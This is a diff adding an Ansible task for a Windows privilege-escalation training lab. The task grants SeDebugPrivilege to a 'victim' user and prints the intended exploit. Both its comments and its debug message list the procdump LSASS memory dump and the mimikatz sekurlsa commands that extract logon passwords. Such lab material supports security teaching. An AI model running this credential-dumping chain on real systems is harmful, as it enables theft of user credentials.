@@ -1,0 +1,21 @@
+---
+# SeDebugPrivilege Lab Setup
+# Grants SeDebugPrivilege to the victim user, allowing them to open handles
+# to processes owned by other users — including LSASS.
+#
+# Exploit: procdump64.exe -accepteula -ma lsass.exe lsass.dmp
+#          mimikatz# sekurlsa::minidump lsass.dmp
+#          mimikatz# sekurlsa::logonpasswords
+#
+# Reference: https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeDebugPrivilege.md
+
+# ═══ SCENARIO 16 — SeDebugPrivilege ═══
+
+- name: Print SeDebugPrivilege scenario info
+  ansible.builtin.debug:
+    msg:
+      - "=== SeDebugPrivilege Scenario ==="
+      - "User '{{ ludus_win_privesc_victim_user }}' has SeDebugPrivilege."
+      - "Exploit: procdump64.exe -accepteula -ma lsass.exe lsass.dmp"
+      - "         mimikatz# sekurlsa::minidump lsass.dmp"
+      - "         mimikatz# sekurlsa::logonpasswords"
